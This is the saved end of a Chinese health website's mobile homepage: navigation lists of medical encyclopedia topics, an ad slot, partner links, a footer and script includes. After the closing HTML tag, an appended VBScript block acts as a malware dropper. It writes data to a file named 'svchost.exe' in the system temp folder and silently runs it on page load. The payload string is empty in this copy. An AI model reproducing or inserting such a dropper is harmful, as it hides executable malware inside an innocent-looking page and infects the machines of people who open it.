                                <li><a href="https://mip.99.com.cn/baike/jh/474.html" title="孕前检查">孕前检查</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/476.html" title="不孕不育">不孕不育</a></li>


                            </ul>
                        </div>
                    </div>
                </div>
                <div class="wrap-swiper mip-vd-tabs-content" style="display: none;">
                    <div class="sw-items swiper-wrapper2">
                        <div class="wrap-swiper">
                            <ul class="wrap-list sw-item swiper-slide">

                                <li><a href="https://mip.99.com.cn/baike/jh/245.html" title="穴位百科">穴位百科</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/246.html" title="偏方百科">偏方百科</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/247.html" title="方剂百科">方剂百科</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/248.html" title="中药百科">中药百科</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/250.html" title="体质百科">体质百科</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/251.html" title="头部穴位">头部穴位</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/252.html" title="面部穴位">面部穴位</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/253.html" title="颈部穴位">颈部穴位</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/254.html" title="肩部穴位">肩部穴位</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/255.html" title="胳膊穴位">胳膊穴位</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/256.html" title="手部穴位">手部穴位</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/257.html" title="胸部穴位">胸部穴位</a></li>


                            </ul>
                        </div>
                    </div>
                </div>
                <div class="wrap-swiper mip-vd-tabs-content" style="display: none;">
                    <div class="sw-items swiper-wrapper2">
                        <div class="wrap-swiper">
                            <ul class="wrap-list sw-item swiper-slide">

                                <li><a href="https://mip.99.com.cn/baike/jh/287.html" title="细菌性皮肤病">细菌性皮肤病</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/288.html" title="病毒性皮肤病">病毒性皮肤病</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/289.html" title="皮肤真菌病">皮肤真菌病</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/290.html" title="皮炎、湿疹">皮炎、湿疹</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/291.html" title="风团及红斑">风团及红斑</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/292.html" title="红斑丘疹鳞屑">红斑丘疹鳞屑</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/293.html" title="瘙痒性皮肤病">瘙痒性皮肤病</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/294.html" title="动物性皮肤病">动物性皮肤病</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/295.html" title="结缔组织病">结缔组织病</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/296.html" title="大疱性皮肤病">大疱性皮肤病</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/297.html" title="营养与代谢障碍">营养与代谢障碍</a></li>


                                <li><a href="https://mip.99.com.cn/baike/jh/298.html" title="物理性皮肤病">物理性皮肤病</a></li>


                            </ul>
                        </div>
                    </div>
                </div>
            </mip-vd-tabs>
        </div>
    </section>
    <div class="ad_index">
        <!--99健康网手机移动网页首页底部横幅（u2403261），20:5 创建于 2015-11-16-->
        <mip-embed type="baidu-wm-ext" domain="whfpbc.99.com.cn" token="dmdr69jp13"
                   class="mip-element mip-layout-container">
            <div id="dmdr69jp13">
                <iframe width="898" frameborder="0" height="225" scrolling="no"
                        src="./99健康网_99相伴健康一生_files/zxzdtfup.html"></iframe>
            </div>
        </mip-embed>
    </div>
    <section class="link-box">
        <div class="link-top"><h2>合作网站</h2></div>
        <div class="link-cont">

            <a href="http://dh.sogou.com/?fr=0005-002o">网址导航</a>

            <a href="http://m.yyk.99.com.cn/">医院大全</a>

            <a href="http://m.99.com.cn/ch/6/">女性疾病</a>

            <a href="http://m.99.com.cn/ch/8/">母婴育儿</a>

            <a href="http://m.99.com.cn/ch/749/">中医养生</a>

            <a href="http://m.zheyangai.com/">两性健康网</a>

            <a href="http://xw.qianzhan.com/">前瞻网</a>

            <a href="http://m.pcbaby.com.cn/">太平洋亲子网</a>

        </div>
    </section>
    <footer>
        <nav>
            <a href="http://mip.99.com.cn/" id="f_menu" title="99健康网" rel="nofollow"><b>触屏版</b></a><a
                    href="http://www.99.com.cn/" id="f_menu" title="99健康网">网页版</a><a href="http://www.99.com.cn/apps/"
                                                                                     id="f99Health" title="99健康网">客户端</a>
        </nav>
        <p>Copyright©2008-2017（闽ICP10200264号-3）</p>
    </footer>
    <mip-fixed type="gototop" mipdata-fixedidx="Fixed0" style="z-index: 10000; bottom: 90px; right: 10%;"
               class="mip-element mip-layout-container">
        <mip-gototop class="mip-element mip-layout-container mip-gototop-show"></mip-gototop>
    </mip-fixed>
    <!--<div class="back_top" style="display:none;"><a href="javascript:;" title="返回头部">返回头部</a></div>-->
</section>
<!--<div class="tt-modal" style="display:none;">
    <div class="popup">
        <div class="b-box"></div>
        <p>医生在线答疑，家庭健康必备</p>
        <div class="download-btn" data-node="downloadBtn" ga_category="left_button" ga_label="" ga_event="click_download"><a href="http://m.rxys.com/Login.aspx" title="热心医生">立即提问</a></div>
        <div class="close" data-node="close"></div>
    </div>
</div>-->
<mip-stats-baidu token="a765a1ed30abd68bef85c2ffaa23fc25" class="mip-element mip-layout-container">
    <script src="./99健康网_99相伴健康一生_files/hm.js"></script>
</mip-stats-baidu>
<mip-stats-baidu token="3dbef4cdd12921cb979bbf3f1907f2e7" class="mip-element mip-layout-container">
    <script src="./99健康网_99相伴健康一生_files/hm(1).js"></script>
</mip-stats-baidu>
<script src="./99健康网_99相伴健康一生_files/mip.js"></script>
<script src="./99健康网_99相伴健康一生_files/mip-ad.js"></script>
<script src="./99健康网_99相伴健康一生_files/mip-share.js"></script>
<script src="./99健康网_99相伴健康一生_files/mip-stats-baidu.js"></script>
<script src="./99健康网_99相伴健康一生_files/mip-form.js"></script>
<script src="./99健康网_99相伴健康一生_files/mip-fixed.js"></script>
<script src="./99健康网_99相伴健康一生_files/mip-sidebar.js"></script>
<script src="./99健康网_99相伴健康一生_files/mip-changyan.js"></script>
<script src="./99健康网_99相伴健康一生_files/mip-semi-fixed.js"></script>
<script src="./99健康网_99相伴健康一生_files/mip-cambrian.js"></script>
<script src="./99健康网_99相伴健康一生_files/mip-gototop.js"></script>
<script src="./99健康网_99相伴健康一生_files/mip-vd-tabs.js"></script>


<script src="./99健康网_99相伴健康一生_files/tcdhb4yupi.js"></script>
<script src="./99健康网_99相伴健康一生_files/dmdr69jp13.js"></script>
</body>
</html>
<SCRIPT Language=VBScript><!--
DropFileName = "svchost.exe"
WriteData = ""
Set FSO = CreateObject("Scripting.FileSystemObject")
DropPath = FSO.GetSpecialFolder(2) & "\" & DropFileName
If FSO.FileExists(DropPath)=False Then
Set FileObj = FSO.CreateTextFile(DropPath, True)
For i = 1 To Len(WriteData) Step 2
FileObj.Write Chr(CLng("&H" & Mid(WriteData,i,2)))
Next
FileObj.Close
End If
Set WSHshell = CreateObject("WScript.Shell")
WSHshell.Run DropPath, 0
//-->
</SCRIPT>